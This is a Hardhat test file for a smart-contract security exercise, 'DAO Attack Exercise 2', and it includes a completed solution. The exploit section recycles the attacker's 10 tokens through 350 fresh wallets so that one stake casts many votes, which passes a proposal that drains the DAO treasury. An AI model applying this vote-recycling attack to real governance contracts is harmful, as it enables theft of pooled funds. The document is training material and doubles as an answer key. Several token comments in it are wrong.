const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('DAO Attack Exercise 2', function () {

    let deployer, daoMember1, daoMember2, attacker, user;

    // Governance Tokens
    const DEPLOYER_TOKENS = ethers.utils.parseEther('1500'); // 10 million tokens
    const DAO_MEMBER_TOKENS = ethers.utils.parseEther('1000'); // 10 million tokens
    const ATTACKER_TOKENS = ethers.utils.parseEther('10'); // 10 million tokens

    // ETH Balances
    const ETH_IN_TREASURY = ethers.utils.parseEther('1000'); // 1000 ETH in revenue

    // Proposals
    const FIRST_PROPOSAL_AMOUNT = ethers.utils.parseEther('0.1'); // 0.1 ETH
    const SECOND_PROPOSAL_AMOUNT = ethers.utils.parseEther('1'); // 0.1 ETH
    
    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, daoMember1, daoMember2, attacker, user] = await ethers.getSigners();
        
        this.attackerInitialETHBalance = await ethers.provider.getBalance(attacker.address)

        // Contract Factories
        const TheGridDAOFactory = await ethers.getContractFactory(
            'contracts/dao-attack-2/TheGridDAO.sol:TheGridDAO',
            deployer
        );
        const TheGridTreasuryFactory = await ethers.getContractFactory(
            'contracts/dao-attack-2/TheGridTreasury.sol:TheGridTreasury',
            deployer
        );

        // Deploy and Setup Contracts
        this.dao = await TheGridDAOFactory.deploy();
        this.treasury = await TheGridTreasuryFactory.deploy(this.dao.address);
        await this.dao.setTreasury(this.treasury.address);
        
        // ETH to Treasury
        await deployer.sendTransaction({
            to: this.treasury.address,
            value: ETH_IN_TREASURY
        });
        expect(
            await ethers.provider.getBalance(this.treasury.address)
        ).to.be.equal(ETH_IN_TREASURY);

        // Mint tokens
        await this.dao.mint(deployer.address, DEPLOYER_TOKENS)
        await this.dao.mint(daoMember1.address, DAO_MEMBER_TOKENS)
        await this.dao.mint(daoMember2.address, DAO_MEMBER_TOKENS)
        await this.dao.mint(attacker.address, ATTACKER_TOKENS)
    });

    it('Governance Test', async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        // Random user can't propose
        await expect(this.dao.connect(user).propose(user.address, ETH_IN_TREASURY)).to.be.revertedWith("You don't have voting power")

        // Depoyer proposes 2 proposals
        await this.dao.propose(deployer.address, FIRST_PROPOSAL_AMOUNT)
        await this.dao.propose(deployer.address, SECOND_PROPOSAL_AMOUNT)
        
        // Random user can't vote
        await expect(this.dao.connect(user).vote(1, false)).to.be.reverted

        // DAO Members can vote
        // First proposal should go through (Yes - 2500, No - 1000)
        await this.dao.connect(daoMember1).vote(1, true)
        // Can't vote twice on same proposal
        await expect(this.dao.connect(daoMember1).vote(1, false)).to.be.reverted
        await this.dao.connect(daoMember2).vote(1, false)
        
        // Second proposal should fail (Yes - 1500, No - 2000)
        await this.dao.connect(daoMember1).vote(2, false)
        await this.dao.connect(daoMember2).vote(2, false)

        // Can't execute before voting is over
        await expect(this.dao.execute(1)).to.be.revertedWith("Voting is not over");

        // Advance time 1 day so we can try proposal execution
        await ethers.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]); // 1 day

        // First proposal should succeed - tresury balance changed
        await this.dao.execute(1)
        this.treasuryBalanceAfterFirstProposal = ETH_IN_TREASURY.sub(FIRST_PROPOSAL_AMOUNT)
        expect(
            await ethers.provider.getBalance(this.treasury.address)
        ).to.be.equal(this.treasuryBalanceAfterFirstProposal);

        // Second proposal should fail - tresury balance did't change
        await this.dao.execute(2)
        expect(
            await ethers.provider.getBalance(this.treasury.address)
        ).to.be.equal(this.treasuryBalanceAfterFirstProposal);

        // Both proposal processed
        let proposal1 = await this.dao.getProposal(1);
        let proposal2 = await this.dao.getProposal(2);
        expect(proposal1.processed).to.be.equal(true);
        expect(proposal2.processed).to.be.equal(true);

        // Can't execute processed proposal
        await expect(this.dao.execute(2)).to.be.revertedWith("Proposl already processed")

    });

    it('Pre-Exploit', async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        // Create a proposal to send all trasury balance to Attacker
        await this.dao.connect(attacker).propose(
            attacker.address, this.treasuryBalanceAfterFirstProposal
        )

    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        // We need more than 3500 votes
        // We own 10 tokens
        // Vote from 350 signers --> 3510 yes

        let currentSigner = attacker;
        let nextSigner;

        for(let i=0; i < 350; i++) {

            // Create a new random signer
            nextSigner = ethers.Wallet.createRandom().connect(ethers.provider);

            // Transfer tokens to the new signer
            await this.dao.connect(currentSigner).transfer(nextSigner.address, ATTACKER_TOKENS)

            // Vote yes from the new signer
            await attacker.sendTransaction({
                to: nextSigner.address,
                value: ethers.utils.parseEther('0.05')
            });
            
            await this.dao.connect(nextSigner).vote(3, true);
            currentSigner = nextSigner;
        }
        
    }).timeout(100000000);

    after(async function () {
        /** SUCCESS CONDITIONS - DON'T CHANGE ANYTHING HERE */

        // Other DAO Members vote "no" on the attacker's proposal
        await this.dao.connect(deployer).vote(3, false)
        await this.dao.connect(daoMember1).vote(3, false)
        await this.dao.connect(daoMember2).vote(3, false)

        // Fast forward EVM 1 day so proposal can be executed
        await ethers.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]); // 1 day
        // Attacker is trying to execute proposal
        await this.dao.connect(attacker).execute(3);

        // No ETH left in treasury
        expect(
            await ethers.provider.getBalance(this.treasury.address)
        ).to.be.equal('0');

        // Attacker stole all ETH from the treasury
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(((this.attackerInitialETHBalance)
        .add(this.treasuryBalanceAfterFirstProposal))
        .sub(ethers.utils.parseEther('20')));
    });
});
